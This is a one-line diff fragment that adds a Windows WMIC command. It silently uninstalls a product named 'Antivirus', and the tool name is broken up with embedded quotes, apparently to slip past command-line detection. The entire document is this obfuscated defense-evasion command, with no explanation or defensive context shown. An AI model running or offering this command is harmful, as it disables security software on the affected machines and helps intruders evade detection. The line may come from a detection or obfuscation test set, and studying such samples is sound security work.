@@ -1,0 +1,1 @@
+w"mi"c product where name="Antivirus" call uninstall /nointeractive
